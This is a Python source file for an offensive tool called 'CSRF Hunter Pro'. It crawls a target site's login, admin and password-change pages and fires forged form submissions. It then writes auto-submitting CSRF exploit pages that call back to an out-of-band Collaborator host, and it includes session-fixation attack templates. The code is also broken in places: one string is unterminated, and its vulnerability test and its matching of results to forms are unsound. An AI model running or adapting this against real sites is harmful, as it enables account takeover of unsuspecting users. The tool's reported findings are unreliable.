import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import json
import threading
import time
import base64
import secrets
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
from pathlib import Path
import argparse
from datetime import datetime
import socket
import subprocess
import jsbeautifier

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class CSRFHunterPro:
    def __init__(self, target, threads=100, timeout=15, output_dir="csrf_exploits"):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        
        
        self.csrf_templates = {
            'basic': [
                '<form action="{action}" method="{method}" enctype="multipart/form-data">',
                '<input type="hidden" name="{param}" value="{value}">',
                '</form><script>document.forms[0].submit();</script>'
            ],
            'oob': [
                '<img src="http://{callback}/csrf?param={payload}">',
                '<iframe src="{action}?csrf={payload}"></iframe>'
            ],
            'session_fixation': [
                'Set-Cookie: session={random_session}',
                'Location: {target}/profile?email=victim@test.com'
            ]
        }
        
        self.results = []
        self.vulnerable_forms = []
        self.oob_callback = f"csrf-{secrets.token_hex(4)}.{socket.gethostname()}.burpcollaborator.net"
        
    def banner(self):
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*120}")
        print(f"{Fore.RED + Style.BRIGHT}{'🔥 CSRF HUNTER PRO v8.0 - EXPLOITATION FRAMEWORK 🔥'}")
        print(f"{Fore.CYAN}{'='*120}{Style.RESET_ALL}")
    
    def discover_forms(self, url):
        """Динамическое обнаружение форм (HTML+JS)"""
        forms = []
        try:
            resp = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            
            html_forms = soup.find_all('form')
            for form in html_forms:
                forms.append({
                    'action': urllib.parse.urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'get').upper(),
                    'inputs': [{inp.get('name'): inp.get('value', '')} for inp in form.find_all('input')]
                })
            
            
            js_forms = re.findall(r'["\']([^"\']*\.(post|get|ajax).*?\?[^"\']*)["\']', resp.text)
            for js_url in js_forms[:10]:  # Limit
                forms.append({
                    'action': urllib.parse.urljoin(url, js_url),
                    'method': 'POST',
                    'inputs': [{'csrf_test': '1'}],
                    'type': 'AJAX'
                })
                
        except:
            pass
        
        return forms
    
    def test_csrf_protection(self, form):
        """Тестирование CSRF защиты"""
        action = form['action']
        method = form['method']
        inputs = form.get('inputs', [])
        
        
        test_data = {inp_name: inp_value for inp in inputs for inp_name, inp_value in inp.items()}
        test_data['_csrf_test'] = '1'  
        
        try:
            if method == 'POST':
                resp = self.session.post(action, data=test_data, timeout=self.timeout)
            else:
                resp = self.session.get(action, params=test_data, timeout=self.timeout)
            
            
            if resp.status_code in [200, 302, 201]:
                return True
        except:
            pass
        
        return False
    
    def generate_poc(self, form):
        """Авто PoC HTML генерация"""
        action = form['action']
        method = form['method']
        inputs = form.get('inputs', [])
        
        poc_html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {action}</title>
    <meta http-equiv="Content-Security-Policy" content="frame-ancestors *">
</head>
<body>
    <h2>🔥 CSRF EXPLOIT POC</h2>
    <p>Target: {action}</p>
    
    <form id="csrf-poc" action="{action}" method="{method}">
'''
        
        for inp in inputs:
            for name, value in inp.items():
                poc_html += f'        <input type="hidden" name="{name}" value="{value}">\n'
        
        poc_html += '''
        <input type="hidden" name="_csrf_exploit" value="1">
    </form>
    
    <script>
        // Auto-submit
        document.getElementById("csrf-poc").submit();
        
        // OOB callback
        new Image().src = "http://{callback}/hit?target={action_enc}";
    </script>
</body>
</html>
        '''.format(callback=self.oob_callback, action_enc=urllib.parse.quote_plus(action))
        
        return poc_html
    
    def session_fixation_attack(self, target):
        """Session fixation CSRF"""
        print(f"{Fore.CYAN}[*] Testing session fixation...{Style.RESET_ALL}")
        
        session_id = secrets.token_hex(16)
        cookies = {'session': session_id, 'PHPSESSID': session_id}
        
        resp = self.session.get(f"{target}/login", cookies=cookies, timeout=self.timeout)
        if resp.status_code == 200:
            
            poc = f'<img src="{target}/profile?email=victim@evil.com" onload="this.src+=\'&session={session_id}\'">
            return True
        
        return False
    
    def run_full_csrf_hunt(self):
        """Полная CSRF эксплуатация"""
        self.banner()
        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.target}{Style.RESET_ALL}")
        
        # Multi-page form discovery
        pages = [
            f"{self.target}", f"{self.target}/login", f"{self.target}/profile",
            f"{self.target}/settings", f"{self.target}/admin", f"{self.target}/change-password"
        ]
        
        all_forms = []
        print(f"{Fore.CYAN}[*] Discovering forms across {len(pages)} pages...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.discover_forms, page) for page in pages]
            for future in as_completed(futures):
                all_forms.extend(future.result())
        
        print(f"{Fore.GREEN}[+] Found {len(all_forms)} forms for testing{Style.RESET_ALL}")
        
        # Test CSRF protection
        vulnerable_count = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_csrf_protection, form) for form in all_forms]
            for i, future in enumerate(as_completed(futures)):
                if future.result():
                    vulnerable_count += 1
                    vuln_form = all_forms[i % len(all_forms)]
                    vuln_form['poc_html'] = self.generate_poc(vuln_form)
                    self.vulnerable_forms.append(vuln_form)
        
        
        self.generate_exploit_report()
        
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*120}")
        print(f"🎯 CSRF SUMMARY: {vulnerable_count}/{len(all_forms)} VULNERABLE FORMS!")
        print(f"{Fore.RED + Style.BRIGHT}{'='*120}{Style.RESET_ALL}")
    
    def generate_exploit_report(self):
        """Профессиональный эксплойт отчет"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'total_forms': len(self.vulnerable_forms),
            'vulnerable_forms': len(self.vulnerable_forms),
            'oob_callback': self.oob_callback,
            'cvss_score': 8.8 if self.vulnerable_forms else 0,
            'risk': 'HIGH' if self.vulnerable_forms else 'INFO',
            'exploits': []
        }
        
        for i, form in enumerate(self.vulnerable_forms):
            poc_file = self.output_dir / f"csrf_poc_{timestamp}_{i}.html"
            with open(poc_file, 'w', encoding='utf-8') as f:
                f.write(form['poc_html'])
            
            report['exploits'].append({
                'form_id': i,
                'action': form['action'],
                'method': form['method'],
                'poc_file': str(poc_file),
                'impact': 'Account takeover, data modification, financial fraud'
            })
        
        json_file = self.output_dir / f"csrf_exploit_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}📊 EXPLOIT REPORTS GENERATED:{Style.RESET_ALL}")
        print(f"   JSON: {json_file}")
        for poc in self.output_dir.glob("csrf_poc_*.html"):
            print(f"   PoC: {poc} {'🔥' if self.vulnerable_forms else ''}")


def run():
    '''Wrapper function for main.py integration'''
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(description='🔥 CSRF Hunter Pro v8.0 - Full Exploitation')
    parser.add_argument('target', help='Target URL (app root)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Threads')
    parser.add_argument('--timeout', type=int, default=15, help='Timeout')
    parser.add_argument('-o', '--output', default='csrf_exploits', help='Output dir')
    
    args = parser.parse_args()
    
    hunter = CSRFHunterPro(args.target, args.threads, args.timeout, args.output)
    hunter.run_full_csrf_hunt()
    
    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*120}")
    input("💥 CSRF hunt complete. PoCs ready! Press Enter...")

if __name__ == "__main__":
    main()